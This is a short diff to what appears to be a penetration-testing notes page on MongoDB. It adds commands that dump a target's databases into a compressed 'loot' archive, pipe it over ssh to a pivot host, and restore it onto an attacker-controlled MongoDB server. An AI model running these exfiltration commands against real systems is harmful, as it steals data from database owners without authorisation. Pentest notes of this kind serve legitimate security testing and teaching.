@@ -14,6 +14,20 @@ mongodump --uri="mongodb://<target>:27017" -o ./dump/
 mongodump --uri="mongodb://<user>:<pass>@<target>:27017/?authSource=admin" -o ./dump/
 # One database / collection
 mongodump --host <target> --db <db> --collection <coll> -o ./dump/
+
+# Efficient exfil: single compressed archive file instead of a dir tree
+# (streamable — pipe it straight back over a pivot)
+mongodump --uri="mongodb://<target>:27017" --archive=loot.gz --gzip
+mongodump --uri="mongodb://<target>:27017" --archive | ssh pivot 'cat > loot.archive'
+```
+
+**Reading the loot** — dumps land as `.bson`; convert to readable JSON with `bsondump` (same package):
+
+```bash
+bsondump ./dump/<db>/users.bson            # BSON → JSON on stdout
+bsondump --pretty ./dump/<db>/users.bson
+# Restore an --archive/--gzip dump elsewhere:
+mongorestore --archive=loot.gz --gzip --uri="mongodb://<attacker-mongo>:27017"
 ```
 
 > [!note] **See also**
@@ -23,5 +37,5 @@ mongodump --host <target> --db <db> --collection <coll> -o ./dump/
 ---
 
 *Created: 2026-09-22*
-*Updated: 2026-09-22*
+*Updated: 2026-09-29*
 *Model: claude-opus-4-8*
